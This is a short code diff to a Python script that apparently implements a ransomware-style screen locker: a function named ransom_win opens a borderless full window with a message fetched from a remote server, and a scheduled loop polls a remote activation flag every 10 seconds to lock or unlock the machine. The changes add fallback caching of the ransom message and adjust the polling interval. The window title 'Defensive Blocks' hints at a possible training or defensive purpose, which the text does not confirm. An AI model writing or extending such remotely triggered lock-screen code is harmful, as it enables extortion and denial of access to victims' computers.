@@ -22,7 +22,10 @@ wa = ""
 
 
 def ransom_win():
-    msg = requests.get(getMsg).text  # get user message from db
+    try:
+        msg = requests.get(getMsg).text  # get user message from db
+    except:
+        msg = get(final.msg_field)
     wa = tk.Tk()
     wa.title('Defensive Blocks')
     wa.overrideredirect(True)
@@ -51,13 +54,14 @@ def ransom_win():
 def main():
     try:
         activation = (requests.get(getActivation)).text  # current activation
+        msg = (requests.get(getMsg)).text
+        replace(final.msg_field,msg)
     except:
         activation = get(final.active_field)
-    print(activation)
     try:
-        is_open = wa.winfo_ismapped()  # if the window is open return 1"""
+        is_open = wa.winfo_ismapped()  # if the window is open return 1
     except:
-        is_open = 0  # if window closed return exception """
+        is_open = 0  # if window closed return exception
     if get(final.active_field) != str(activation):  # compare previous to current
         if str(activation) == "1" and get(final.active_field) == "0":  # if current is true, current is false
             replace(final.active_field, activation)  # chagne current to true
@@ -78,7 +82,6 @@ def main():
             replace(final.active_field, 0)
             unlock()
     else:
-        print("in else")
         return
 
 """
@@ -86,6 +89,6 @@ scheduler.add_job(main, 'cron', second=final.repeats)  # run every x seconds
 scheduler.start()
 """
 
-schedule.every(15).seconds.do(main)
+schedule.every(10).seconds.do(main)
 while True:
     schedule.run_pending()
